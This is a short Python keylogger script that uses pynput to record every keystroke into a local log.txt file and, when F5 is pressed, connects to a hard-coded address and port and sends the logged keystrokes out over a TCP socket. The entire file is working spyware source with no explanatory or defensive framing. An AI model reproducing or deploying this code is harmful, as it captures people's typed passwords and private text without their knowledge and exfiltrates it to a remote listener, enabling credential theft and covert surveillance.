from pynput.keyboard import Listener
import socket

ip = '192.168.1.12'
port = 5678

def anonymous(key):
    key = str(key)
    key = key.replace("'"," ")
    if(key=='Key.esc'):
        raise SystemExit(0) 
    if(key=='Key.enter'):
        key = '\n'
    if(key == '<96>'):
        key = '0'
    if(key == '<97>'):
        key = '1'
    if(key == '<98>'):
        key = '2'
    if(key == '<99>'):
        key = '3'
    if(key == '<100>'):
        key = '4'
    if(key == '<101>'):
        key = '5'
    if(key == '<102>'):
        key = '6'
    if(key == '<103>'):
        key = '7'
    if(key == '<104>'):
        key = '8'
    if(key == '<105>'):
        key = '9'
    with open("log.txt", "a") as f:
        f.write(key)
    if(key=='Key.f5'):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            f = open ("log.txt", "rb")
            l = f.read(1024)
            while(l):
                s.send(l)
                l = f.read(1024)
    print(key)

with Listener(on_press=anonymous) as listen:
    listen.join()